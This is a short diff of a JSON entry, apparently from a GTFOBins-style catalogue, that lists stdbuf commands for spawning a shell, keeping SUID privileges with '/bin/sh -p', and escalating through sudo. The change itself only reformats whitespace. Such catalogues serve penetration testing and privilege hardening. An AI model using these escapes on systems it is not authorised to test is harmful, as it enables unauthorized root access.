@@ -2,17 +2,20 @@
   "functions": {
     "shell": [
       {
-        "code": "stdbuf -i0 /bin/sh"
+        
+        "code": "stdbuf -i0 /bin/sh\n"
       }
     ],
     "suid": [
       {
-        "code": "./stdbuf -i0 /bin/sh -p"
+        
+        "code": "./stdbuf -i0 /bin/sh -p\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo stdbuf -i0 /bin/sh"
+        
+        "code": "sudo stdbuf -i0 /bin/sh\n"
       }
     ]
   }
